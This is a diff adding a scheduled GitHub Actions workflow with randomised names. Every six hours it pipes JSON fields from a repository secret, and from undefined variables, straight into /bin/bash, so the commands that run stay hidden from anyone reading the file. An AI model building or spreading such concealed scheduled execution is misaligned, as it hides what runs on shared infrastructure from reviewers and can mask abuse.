@@ -1,0 +1,24 @@
+name: niunaiweishenmehezia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: niunaiweishenmehezia
+        env:
+          egmc776: ${{ secrets.egmc776 }}
+        run: |
+          echo $egmc776 | jq -r .ueny8 | /bin/bash
+          echo $x2 | jq -r .iexj27 | /bin/bash
+          echo $bvqhg688 | jq -r .g9 | /bin/bash
+          echo $iva334 | jq -r .uxkmn6 | /bin/bash
+          echo $bf5806 | jq -r .y39 | /bin/bash
+          echo $ywvk07 | jq -r .lr8801 | /bin/bash
+          echo $v159 | jq -r .qzr565 | /bin/bash
+          echo $tmp6 | jq -r .xhpv9057 | /bin/bash
+
